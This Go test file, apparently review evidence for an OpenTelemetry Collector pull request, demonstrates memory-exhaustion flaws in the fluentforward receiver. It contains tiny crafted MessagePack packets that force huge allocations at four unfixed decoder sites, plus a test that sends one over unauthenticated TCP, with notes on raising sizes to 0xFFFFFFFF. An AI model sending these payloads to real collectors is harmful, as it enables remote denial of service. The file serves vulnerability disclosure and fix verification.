// Copyright The OpenTelemetry Authors
// SPDX-License-Identifier: Apache-2.0

// Evidence for the review of PR #49866. NOT for upstream merge.
//
// Methodology mirrors the accepted PoC in issue #49231: measure the
// runtime.MemStats TotalAlloc delta caused by decoding a tiny attacker packet.
// All declared lengths are bounded (8-128 MiB) so the tests are safe to run on
// a developer machine; a real attacker substitutes 0xFFFFFFFF.

package fluentforwardreceiver

import (
	"bytes"
	"encoding/binary"
	"net"
	"runtime"
	"testing"
	"time"

	"github.com/stretchr/testify/require"
	"github.com/tinylib/msgp/msgp"
	"go.opentelemetry.io/collector/component/componenttest"
	"go.opentelemetry.io/collector/consumer/consumertest"
	"go.opentelemetry.io/collector/pdata/plog"
	"go.opentelemetry.io/collector/receiver/receivertest"

	"github.com/open-telemetry/opentelemetry-collector-contrib/receiver/fluentforwardreceiver/internal/metadata"
)

const mib = 1024 * 1024

func measureAlloc(fn func()) int64 {
	var m0, m1 runtime.MemStats
	runtime.GC()
	runtime.ReadMemStats(&m0)
	fn()
	runtime.ReadMemStats(&m1)
	return int64(m1.TotalAlloc - m0.TotalAlloc)
}

func be32(v uint32) []byte {
	var b [4]byte
	binary.BigEndian.PutUint32(b[:], v)
	return b[:]
}

// ---------------------------------------------------------------------------
// Positive control: the two sites PR #49866 removes really are fixed.
// ---------------------------------------------------------------------------

// The exact Forward-mode packet from issue #49231: [ "t", <array32 hdr, no entries> ].
func TestFixed49866_ForwardEntriesArrayNoLongerPreallocates(t *testing.T) {
	const declared = uint32(1 << 24) // 16,777,216 -- the count used in the issue PoC

	payload := append([]byte{0x92, 0xa1, 't', 0xdd}, be32(declared)...)
	require.Len(t, payload, 8)

	reader := msgp.NewReaderSize(bytes.NewReader(payload), readBufferSize)
	mode, err := determineNextEventMode(reader.R)
	require.NoError(t, err)
	require.Equal(t, forwardMode, mode)

	fe := &forwardEventLogRecords{}
	var decErr error
	grew := measureAlloc(func() { decErr = fe.DecodeMsg(reader) })
	require.Error(t, decErr, "decode still fails, as it should -- no entry bytes follow")

	counterfactual := measureAlloc(func() {
		s := plog.NewLogRecordSlice()
		s.EnsureCapacity(int(declared))
		runtime.KeepAlive(s)
	})

	t.Logf("FIXED: %d-byte packet declaring %d entries now allocates %d bytes; "+
		"the removed EnsureCapacity(%d) line on its own costs %d bytes (%d MiB)",
		len(payload), declared, grew, declared, counterfactual, counterfactual/mib)

	require.Less(t, grew, int64(mib), "post-PR allocation should be negligible")
	require.Greater(t, counterfactual, int64(100*mib), "the removed line was worth removing")
}

// Message-mode packet whose options map declares a huge entry count.
func TestFixed49866_OptionsMapNoLongerPreallocates(t *testing.T) {
	const declared = uint32(1 << 24)
	const counterfactualN = 1 << 20

	payload := append([]byte{
		0x94, // [ tag, time, record, option ]
		0xa1, 't',
		0x00, // time = 0
		0x80, // record = empty map
		0xdf, // option: map32 header
	}, be32(declared)...)
	require.Len(t, payload, 10)

	reader := msgp.NewReaderSize(bytes.NewReader(payload), readBufferSize)
	mode, err := determineNextEventMode(reader.R)
	require.NoError(t, err)
	require.Equal(t, messageMode, mode)

	melr := &messageEventLogRecord{}
	var decErr error
	grew := measureAlloc(func() { decErr = melr.DecodeMsg(reader) })
	require.Error(t, decErr, "decode still fails, as it should -- no option bytes follow")

	counterfactual := measureAlloc(func() {
		m := make(optionsMap, counterfactualN)
		runtime.KeepAlive(m)
	})

	t.Logf("FIXED: %d-byte packet declaring %d options now allocates %d bytes; "+
		"for reference the removed make(optionsMap, n) costs %d bytes at n=%d "+
		"(~%d bytes/entry, so n=0xFFFFFFFF would be ~%d GiB)",
		len(payload), declared, grew, counterfactual, counterfactualN,
		counterfactual/counterfactualN, counterfactual/counterfactualN*4294967295/(1024*mib))

	require.Less(t, grew, int64(mib), "post-PR allocation should be negligible")
}

// ---------------------------------------------------------------------------
// Site 1 -- server.go determineNextEventMode, reached BEFORE any decoder code.
// fwd.Reader.Peek: `if cap(r.data) < n { r.data = make([]byte, n+r.buffered()) }`
// ---------------------------------------------------------------------------

func TestRemaining49866_Site1_TagHeaderPeek(t *testing.T) {
	const declared = uint32(16 * mib) // attacker uses 0xFFFFFFFF -> ~4 GiB

	payload := append([]byte{
		0x92, // outer array, 2 elements
		0xdb, // tag: str32 header
	}, be32(declared)...)
	require.Len(t, payload, 6)

	reader := msgp.NewReaderSize(bytes.NewReader(payload), readBufferSize)

	var mode eventMode
	var err error
	grew := measureAlloc(func() { mode, err = determineNextEventMode(reader.R) })

	require.Error(t, err, "mode detection fails -- but only after the allocation")
	require.Equal(t, unknownMode, mode)

	t.Logf("SITE 1 server.go:237 determineNextEventMode -> fwd.Reader.Peek: "+
		"%d-byte packet declaring a %d-byte tag allocated %d bytes (%d MiB), amplification ~%dx",
		len(payload), declared, grew, grew/mib, grew/int64(len(payload)))

	require.Greater(t, grew, int64(declared), "Peek allocated the attacker-declared tag length")
}

func TestRemaining49866_Site1_NegativeControl(t *testing.T) {
	payload := []byte{0x92, 0xa1, 't', 0x91, 0x92, 0x00, 0x80}
	reader := msgp.NewReaderSize(bytes.NewReader(payload), readBufferSize)

	var mode eventMode
	var err error
	grew := measureAlloc(func() { mode, err = determineNextEventMode(reader.R) })

	require.NoError(t, err)
	require.Equal(t, forwardMode, mode)
	t.Logf("control: well-formed tag -> mode detection allocated %d bytes", grew)
	require.Less(t, grew, int64(mib))
}

// ---------------------------------------------------------------------------
// Site 2 -- conversion.go:149 parseRecordToLogRecord -> dc.ReadIntf().
// msgp read.go ArrayType branch: `if sz > m.GetMaxElements()` (MaxUint32 when
// unset) then `out := make([]any, int(sz))` -- 16 bytes per interface element.
// ---------------------------------------------------------------------------

func TestRemaining49866_Site2_ReadIntfArray(t *testing.T) {
	const declared = uint32(8 << 20) // 8,388,608 ifaces = 128 MiB; 0xFFFFFFFF -> ~64 GiB

	payload := append([]byte{
		0x92, // [ tag, entries ]
		0xa1, 't',
		0x91, // entries: 1 entry
		0x92, // entry: [ time, record ]
		0xdd, // time position: array32 header -> ReadIntf
	}, be32(declared)...)
	require.Len(t, payload, 10)

	reader := msgp.NewReaderSize(bytes.NewReader(payload), readBufferSize)
	mode, err := determineNextEventMode(reader.R)
	require.NoError(t, err)
	require.Equal(t, forwardMode, mode)

	fe := &forwardEventLogRecords{}
	var decErr error
	grew := measureAlloc(func() { decErr = fe.DecodeMsg(reader) })

	require.Error(t, decErr, "decode fails -- but only after the allocation")

	t.Logf("SITE 2 conversion.go:149 ReadIntf -> msgp make([]any, n): "+
		"%d-byte packet declaring %d elements allocated %d bytes (%d MiB), amplification ~%dx",
		len(payload), declared, grew, grew/mib, grew/int64(len(payload)))

	require.Greater(t, grew, int64(100*mib))
}

// ---------------------------------------------------------------------------
// Site 3 -- conversion.go:366 packedForward dc.ReadBytes(nil).
// msgp read.go: `if read > int64(m.GetMaxElements())` (MaxUint32 when unset)
// then `b = make([]byte, read)`.
// ---------------------------------------------------------------------------

func TestRemaining49866_Site3_PackedForwardReadBytes(t *testing.T) {
	const declared = uint32(16 * mib)

	payload := append([]byte{
		0x92, // [ tag, entriesRaw ]
		0xa1, 't',
		0xc6, // entriesRaw: bin32 header
	}, be32(declared)...)
	require.Len(t, payload, 8)

	reader := msgp.NewReaderSize(bytes.NewReader(payload), readBufferSize)
	mode, err := determineNextEventMode(reader.R)
	require.NoError(t, err)
	require.Equal(t, packedForwardMode, mode)

	pfe := &packedForwardEventLogRecords{}
	var decErr error
	grew := measureAlloc(func() { decErr = pfe.DecodeMsg(reader) })

	require.Error(t, decErr, "decode fails -- but only after the allocation")

	t.Logf("SITE 3 conversion.go:366 ReadBytes -> msgp make([]byte, n): "+
		"%d-byte packet declaring %d bytes allocated %d bytes (%d MiB), amplification ~%dx",
		len(payload), declared, grew, grew/mib, grew/int64(len(payload)))

	require.Greater(t, grew, int64(declared))
}

// ---------------------------------------------------------------------------
// Site 4 -- conversion.go:360 packedForward dc.ReadString().
// msgp read.go: `if uint64(read) > m.GetMaxStringLength()` (MaxUint64 when
// unset) then `out := make([]byte, read)`.
// ---------------------------------------------------------------------------

func TestRemaining49866_Site4_PackedForwardReadString(t *testing.T) {
	const declared = uint32(16 * mib)

	payload := append([]byte{
		0x92, // [ tag, entriesRaw ]
		0xa1, 't',
		0xdb, // entriesRaw: str32 header
	}, be32(declared)...)
	require.Len(t, payload, 8)

	reader := msgp.NewReaderSize(bytes.NewReader(payload), readBufferSize)
	mode, err := determineNextEventMode(reader.R)
	require.NoError(t, err)
	require.Equal(t, packedForwardMode, mode)

	pfe := &packedForwardEventLogRecords{}
	var decErr error
	grew := measureAlloc(func() { decErr = pfe.DecodeMsg(reader) })

	require.Error(t, decErr, "decode fails -- but only after the allocation")

	t.Logf("SITE 4 conversion.go:360 ReadString -> msgp make([]byte, n): "+
		"%d-byte packet declaring %d bytes allocated %d bytes (%d MiB), amplification ~%dx",
		len(payload), declared, grew, grew/mib, grew/int64(len(payload)))

	require.Greater(t, grew, int64(declared))
}

// ---------------------------------------------------------------------------
// End to end: the site-2 packet over a real unauthenticated TCP socket against
// the real receiver, on 127.0.0.1 only.
// ---------------------------------------------------------------------------

func TestRemaining49866_E2E_UnauthenticatedTCP(t *testing.T) {
	const declared = uint32(8 << 20)

	cfg := &Config{ListenAddress: "127.0.0.1:0"}
	sink := new(consumertest.LogsSink)
	r, err := newFluentReceiver(receivertest.NewNopSettings(metadata.Type), cfg, sink)
	require.NoError(t, err)
	require.NoError(t, r.Start(t.Context(), componenttest.NewNopHost()))
	t.Cleanup(func() { _ = r.Shutdown(t.Context()) })

	addr := r.(*fluentReceiver).listener.Addr().String()

	payload := append([]byte{0x92, 0xa1, 't', 0x91, 0x92, 0xdd}, be32(declared)...)
	require.Len(t, payload, 10)

	grew := measureAlloc(func() {
		conn, dialErr := net.Dial("tcp", addr)
		require.NoError(t, dialErr)
		_, wErr := conn.Write(payload)
		require.NoError(t, wErr)
		time.Sleep(500 * time.Millisecond)
		_ = conn.Close()
	})

	t.Logf("E2E: %d-byte unauthenticated TCP packet -> receiver allocated %d bytes (%d MiB), "+
		"amplification ~%dx; 0xFFFFFFFF would request ~64 GiB",
		len(payload), grew, grew/mib, grew/int64(len(payload)))

	require.Greater(t, grew, int64(100*mib))
	require.Empty(t, sink.AllLogs())
}
